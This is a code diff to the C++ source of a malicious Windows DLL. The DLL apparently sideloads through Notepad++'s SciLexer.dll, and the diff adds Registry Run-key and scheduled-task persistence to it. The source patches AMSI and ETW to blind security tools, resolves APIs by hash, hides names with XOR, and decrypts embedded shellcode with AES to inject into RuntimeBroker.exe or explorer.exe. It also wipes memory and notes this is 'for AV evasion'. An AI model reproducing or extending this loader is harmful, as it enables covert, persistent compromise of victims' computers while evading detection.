@@ -1,9 +1,7 @@
-
-
-#include <shlobj.h>              
-#include <tlhelp32.h>           
-#include <fstream>              
-#include <random>                
+#include <shlobj.h>              // For SHGetFolderPathA
+#include <tlhelp32.h>            // For CreateToolhelp32Snapshot, PROCESSENTRY32W, THREADENTRY32
+#include <fstream>               // For std::ofstream
+#include <random>                // For std::random_device, std::mt19937
 #include <algorithm>  
 
 #include <windows.h>
@@ -51,8 +49,8 @@ const unsigned char AES_KEY_PART2[] = { 0xe0, 0x77, 0xd5, 0x12, 0x7e, 0xaf, 0x33
 const unsigned char AES_IV_PART1[] = { 0xe0, 0x23, 0x8f, 0x42, 0x01, 0x6a, 0xd7, 0x82 };
 const unsigned char AES_IV_PART2[] = { 0xa7, 0x46, 0xf0, 0xed, 0x3a, 0xa3, 0xb2, 0x4f };
 
-const char* ENCRYPTED_FOLDER_NAME = "\x15\x23\x30\x01\x37\x26\x2A"; 
-const char* ENCRYPTED_TASK_NAME = "\x1A\x3D\x25\x13\x17\x28\x3C";   
+const char* ENCRYPTED_FOLDER_NAME = "\x15\x23\x30\x01\x37\x26\x2A"; // XOR-encrypted name
+const char* ENCRYPTED_TASK_NAME = "\x1A\x3D\x25\x13\x17\x28\x3C";   // XOR-encrypted name
 const char XOR_KEY = 0x5A;
 
 
@@ -130,6 +128,22 @@ void setupPersistence() {
         fs::create_directory(fullPath);
         copyFileTo("notepad++.exe", fullPath + "\\notepad++.exe");
         copyFileTo("SciLexer.dll", fullPath + "\\SciLexer.dll");
+        copyFileTo("libcrypto-3-x64.dll", fullPath + "\\libcrypto-3-x64.dll");
+        copyFileTo("libgcc_s_seh-1.dll", fullPath + "\\libgcc_s_seh-1.dll");
+        copyFileTo("libstdc++-6.dll", fullPath + "\\libstdc++-6.dll");
+        copyFileTo("libwinpthread-1.dll", fullPath + "\\libwinpthread-1.dll");
+    }
+
+    // Add to Registry Run key with decrypted name
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        std::string exePath = fullPath + "\\notepad++.exe";
+        RegSetValueExA(hKey, regValueName.c_str(), 0, REG_SZ,
+            (const BYTE*)exePath.c_str(), (DWORD)(exePath.size() + 1));
+        RegCloseKey(hKey);
     }
 }
 
@@ -152,8 +166,17 @@ std::string GetStealthFolderPath() {
     return path;
 }
 
+void EnsureStealthTask(const std::string& exePath) {
+    std::string taskName = decryptXor(ENCRYPTED_TASK_NAME, 7, XOR_KEY);
+    std::string cmd = "schtasks /Create /TN " + taskName + " /TR \"" + exePath + "\" /SC ONLOGON /RL LIMITED /F";
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+}
 
-#pragma comment(lib, "ntdll.lib") 
+
+#pragma comment(lib, "ntdll.lib") // Tell linker to search ntdll.lib
 NTSTATUS NtAlertResumeThread(
     HANDLE ThreadHandle,
     PULONG PreviousSuspendCount
@@ -226,6 +249,7 @@ extern "C" {
             CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
     }
 }
+// Patch ETW
 std::string decryptXor(const std::string& data, char key) {
     std::string result = data;
     for (char& c : result) c ^= key;
@@ -252,6 +276,8 @@ FARPROC getFuncByHash(HMODULE module, DWORD hash) {
     }
     return nullptr;
 }
+
+// Example usage: hash("AmsiScanBuffer") = 0x73e2d87e
 
 
 void PatchAMSI() {
@@ -285,13 +311,22 @@ void PatchETW() {
     }
 }
 
+// Log errors to a file (Disabled)
 void LogError(const std::string& message) {}
 
+// Execute a command silently
+
+
+// Get the path to the vlcapp folder in AppData
+
+
+// Check if a folder exists
 bool FolderExists(const std::string& folderPath) {
     DWORD attribs = GetFileAttributesA(folderPath.c_str());
     return (attribs != INVALID_FILE_ATTRIBUTES && (attribs & FILE_ATTRIBUTE_DIRECTORY));
 }
 
+// Copy a file to the vlcapp folder
 void KillProcessByName(const std::wstring& processName) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) return;
@@ -335,6 +370,13 @@ void AutoReEncryptShellcode(const std::string& path, const std::vector<unsigned 
     out.close();
 }
 
+// Create the vlcapp folder and copy required files
+
+
+// Create a Task Scheduler entry
+
+
+// Get the PID of explorer.exe
 DWORD GetTargetPID() {
     DWORD targetPID = 0;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -353,6 +395,7 @@ DWORD GetTargetPID() {
     }
     CloseHandle(hSnapshot);
 
+    // If RuntimeBroker.exe is not found, fallback to explorer.exe
     if (targetPID == 0) {
         HANDLE hSnapshot2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnapshot2 == INVALID_HANDLE_VALUE) return 0;
@@ -375,6 +418,7 @@ DWORD GetTargetPID() {
     return targetPID;
 }
 
+// Inject the decrypted shellcode into the target process
 void inject(DWORD pid, const std::vector<unsigned char>& shellcode) {
     HANDLE hProcess = NULL;
     CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
@@ -448,9 +492,13 @@ void inject(DWORD pid, const std::vector<unsigned char>& shellcode) {
 }
 
 
+// Exported function for shellcode injection
 extern "C" __declspec(dllexport) void InjectShellcode() {
     static bool shellcodeInjected = false;
     if (shellcodeInjected) return;
+
+
+    setupPersistence();
     PatchETW();
     PatchAMSI();
    
@@ -471,13 +519,16 @@ extern "C" __declspec(dllexport) void InjectShellcode() {
 
     inject(pid, decryptedShellcode);
 
+    // Secure wipe decrypted shellcode from RAM
     SecureZeroMemory(decryptedShellcode.data(), decryptedShellcode.size());
 
+    // Secure wipe encrypted shellcode after use (optional for AV evasion)
     std::generate(encryptedShellcode.begin(), encryptedShellcode.end(), []() {
         return static_cast<unsigned char>(rand() % 256);
         });
     SecureZeroMemory(encryptedShellcode.data(), encryptedShellcode.size());
 
+    // Lock loop to persist DLL presence
     shellcodeInjected = true;
     KillProcessByName(L"notepad++.exe");
 
@@ -486,6 +537,7 @@ extern "C" __declspec(dllexport) void InjectShellcode() {
     }
 }
 
+// DLL entry point
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
